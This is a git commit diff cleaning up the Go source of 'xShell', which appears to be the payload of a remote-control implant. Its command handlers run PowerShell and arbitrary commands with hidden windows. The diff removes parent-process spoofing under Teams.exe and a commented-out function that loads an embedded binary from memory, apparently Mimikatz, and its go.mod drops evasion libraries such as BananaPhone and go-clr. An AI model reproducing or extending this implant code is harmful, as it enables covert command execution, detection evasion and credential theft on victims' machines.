960da272944c40822ce4018e39876e2b269ca228
coremedic <ben@aptlabs.net>
2023-10-24 15:15:05 -0500

    clean up of main

--- go.mod
+++ go.mod
@@ -2,21 +2,11 @@ module xShell
 
 go 1.20
 
-require github.com/brianvoe/gofakeit/v6 v6.23.0
-
 require (
-	github.com/Binject/debug v0.0.0-20200830173345-f54480b6530f // indirect
-	github.com/C-Sto/BananaPhone v0.0.0-20220220002628-6585e5913761 // indirect
-	github.com/amenzhinsky/go-memexec v0.7.1 // indirect
-	github.com/awgh/rawreader v0.0.0-20200626064944-56820a9c6da4 // indirect
-	github.com/chzyer/readline v1.5.1 // indirect
-	github.com/coremedic/goldr v0.0.0-20230929161352-e4ffc1e4e777 // indirect
-	github.com/inconshreveable/mousetrap v1.1.0 // indirect
-	github.com/ropnop/go-clr v0.0.0-20200805161622-a9381fbe4fcd // indirect
-	github.com/spf13/cobra v1.7.0 // indirect
-	github.com/spf13/pflag v1.0.5 // indirect
-	golang.org/x/sys v0.12.0 // indirect
-	golang.org/x/text v0.3.3 // indirect
+	github.com/brianvoe/gofakeit/v6 v6.23.0
+	github.com/chzyer/readline v1.5.1
+	github.com/coremedic/goldr v0.0.0-20230929161352-e4ffc1e4e777
+	golang.org/x/sys v0.12.0
 )
 
 require github.com/enceve/crypto v0.0.0-20160707101852-34d48bb93815 // direct
--- payload/internal/cmds.go
+++ payload/internal/cmds.go
@@ -1,10 +1,6 @@
 package internal
 
 import (
-	"bytes"
-	_ "embed"
-	"fmt"
-	"io"
 	"os"
 	"os/exec"
 
@@ -16,33 +12,13 @@ type FuncPtr func([]string) ([]byte, error)
 var FuncPtrMap = map[string]FuncPtr{
 	"whoami": Whoami,
 	"exec":   Exec,
-	//	"mimi":   Mimi,
-	"kill": Kill,
+	"kill":   Kill,
 }
 
 func Whoami(args []string) ([]byte, error) {
-	var (
-		stdErrBuf bytes.Buffer
-		stdOutBuf bytes.Buffer
-	)
 	cmd := exec.Command("powershell", "-C", "whoami")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	pid, err := GetPid("Teams.exe")
-	if err != nil {
-		return []byte(fmt.Sprintf("Failed to spoof PPID: %s", err.Error())), nil
-	}
-	err = SpoofPPID(pid, cmd)
-	if err != nil {
-		return []byte(fmt.Sprintf("Failed to spoof PPID: %s", err.Error())), nil
-	}
-	cmd.Stderr = stdErr(cmd, &stdErrBuf)
-	cmd.Stdout = stdOut(cmd, &stdOutBuf)
-	err = cmd.Run()
-	if err != nil {
-		return []byte("Error in cmd.Run()"), nil
-	}
-	cmd.Start()
-	return stdOutBuf.Bytes(), nil
+	return cmd.CombinedOutput()
 }
 
 func Exec(args []string) ([]byte, error) {
@@ -51,17 +27,6 @@ func Exec(args []string) ([]byte, error) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd.CombinedOutput()
 }
-
-// func Mimi(args []string) ([]byte, error) {
-// 	bin, err := memexec.New(MK)
-// 	if err != nil {
-// 		return nil, err
-// 	}
-// 	defer bin.Close()
-// 	cmd := bin.Command(args...)
-// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-// 	return cmd.CombinedOutput()
-// }
 
 func Upload(args []string) ([]byte, error) {
 	return nil, nil
@@ -74,12 +39,4 @@ func Download(args []string) ([]byte, error) {
 func Kill(args []string) ([]byte, error) {
 	os.Exit(0)
 	return nil, nil
-}
-
-func stdOut(cmd *exec.Cmd, buf *bytes.Buffer) io.Writer {
-	return io.MultiWriter(buf)
-}
-
-func stdErr(cmd *exec.Cmd, buf *bytes.Buffer) io.Writer {
-	return io.MultiWriter(buf)
 }
